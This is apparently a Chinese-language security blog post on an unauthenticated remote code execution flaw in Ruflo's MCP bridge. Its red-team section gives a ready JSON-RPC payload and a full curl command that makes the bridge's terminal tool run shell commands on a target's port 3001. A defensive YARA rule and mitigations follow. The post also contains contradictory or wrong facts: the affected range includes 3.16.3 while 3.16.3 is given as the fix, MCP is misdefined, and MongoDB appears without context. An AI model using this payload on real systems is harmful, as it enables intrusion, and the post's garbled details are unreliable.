---
layout: post
title:  "Ruflo MCP Flaw Lets Unauthenticated Attackers Run Commands and Poison AI Memory"
date:   2026-07-29 19:02:54 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Ruflo 漏洞：利用 Model Context Protocol 獲取遠端代碼執行權
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數: 10.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Model Context Protocol (MCP), JSON-RPC, Docker Compose

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Ruflo 專案的 `docker-compose.yml` 檔案預設將 MCP 橋接器綁定到所有網路介面（`0.0.0.0`），使得未經驗證的遠端代碼執行成為可能。這是因為 `docker-compose.yml` 中的 `ports` 配置將 MCP 橋接器的 3001 端口暴露給所有網路介面。
* **攻擊流程圖解**:
  1. 攻擊者發送未經驗證的 HTTP POST 請求到目標系統的 3001 端口。
  2. 請求包含 JSON-RPC 格式的 payload，呼叫 `tools/call` 方法並指定 `ruflo__terminal_execute` 工具。
  3. MCP 橋接器處理請求並執行指定的命令，允許攻擊者在目標系統上執行任意代碼。
* **受影響元件**: Ruflo 專案的所有版本，直到 3.16.3 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道目標系統的 IP 地址和 3001 端口是否開放。
* **Payload 建構邏輯**:

    ```
    
    json
    {
      "jsonrpc": "2.0",
      "id": 1,
      "method": "tools/call",
      "params": {
        "name": "ruflo__terminal_execute",
        "arguments": {
          "command": "id && hostname"
        }
      }
    }
    
    ```
  這個 payload 呼叫 `ruflo__terminal_execute` 工具並執行 `id && hostname` 命令，允許攻擊者在目標系統上執行任意代碼。
* **範例指令**:

    ```
    
    bash
    curl -s -X POST https://<target>:3001/mcp -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"ruflo__terminal_execute","arguments":{"command":"id && hostname"}}}'
    
    ```
* **繞過技術**: 如果目標系統有 WAF 或 EDR，攻擊者可能需要使用繞過技巧，例如使用不同的 HTTP 方法或修改 payload 的格式。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 目標系統的 IP 地址 |
| 端口 | 3001 |
| 文件路徑 | `/app` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Ruflo_MCP_Vulnerability {
      meta:
        description = "Ruflo MCP Vulnerability Detection"
      strings:
        $json_rpc = "{ \"jsonrpc\": \"2.0\" }"
        $tools_call = "{ \"method\": \"tools/call\" }"
      condition:
        $json_rpc and $tools_call
    }
    
    ```
  這個 YARA 規則偵測 JSON-RPC 格式的 payload 中包含 `tools/call` 方法。
* **緩解措施**:
 1. 更新 Ruflo 專案到 3.16.3 版本或以上。
 2. 將 MCP 橋接器綁定到 loopback 介面（`127.0.0.1`）。
 3. 啟用 MongoDB 驗證。
 4. 關閉 3001 端口和 27017 端口。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Model Context Protocol (MCP)**: 一種用於 Anthropic Claude Code 和 OpenAI Codex 的 AI 多代理協調平台和工具。
* **JSON-RPC**: 一種輕量級的遠程程序呼叫協議，使用 JSON 格式的 payload。
* **Docker Compose**: 一種用於定義和運行多容器 Docker 應用的工具。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/ruflo-mcp-flaw-lets-unauthenticated.html)
- [Ruflo 專案](https://github.com/ruflo/ruflo)
- [MITRE ATT&CK](https://attack.mitre.org/)


